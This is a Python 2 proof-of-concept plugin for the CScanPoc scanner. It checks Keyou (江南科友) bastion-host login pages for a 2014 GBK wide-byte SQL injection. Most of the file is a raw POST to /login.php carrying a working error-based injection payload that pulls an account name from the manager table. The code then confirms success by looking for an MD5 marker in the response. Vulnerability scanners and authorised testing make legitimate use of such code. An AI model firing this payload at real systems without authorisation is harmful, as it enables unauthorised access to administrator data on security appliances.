# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import time

class Vuln(ABVuln):
    vuln_id = 'Keyou_0002' # 平台漏洞编号，留空
    name = '江南科友堡垒机 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-09-23'  # 漏洞公布时间
    desc = '''  
        江南科友运维安全审计系统（HAC）着眼于解决关键IT基础设施运维安全问题。
        它能够对Unix和Windows主机、服务器以及网络、安全设备上的数据访问进行安全、有效的操作审计,支持实时监控和事后回放。
        HAC补了传统审计系统的不足，将运维审计由事件审计提升为内容审计，集身份认证、授权、审计为一体，有效地实现了事前预防、事中控制和事后审计。

        漏洞原因：
        江南科友该堡垒机由于在登录过程当中，对字符过滤不当，默认是GBK编码，在写入mysql数据库过程当中，采用了该编码，导致产生一个针对中文编码的SQL注入漏洞，熟称“宽字节注入”。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '江南科友堡垒机'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '51157d80-b9c8-4a7c-9fa7-92330f8cdeeb'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #wooyun-2014-061617
            hh = hackhttp.hackhttp()
            arg = self.target
            path = '/login.php'
            target = arg + path
            raw = '''
POST /login.php HTTP/1.1
Host: 192.168.10.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://123.124.158.72/login.php
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 238

password_check=1&account=aaa%cf'+and+exists(select*from+(select*from(select+name_const((select+concat(account,md5(123))+from+manager+limit+0,1),0))a+join+(select+name_const((select+concat(account,md5(123))+from+manager+limit+0,1),0))b)c)#
            '''
            code, head, res, errcode, _ = hh.http(target, raw=raw)
            if code == 200 and '202cb962ac59075b964b07152d234b70' in res:
                #security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
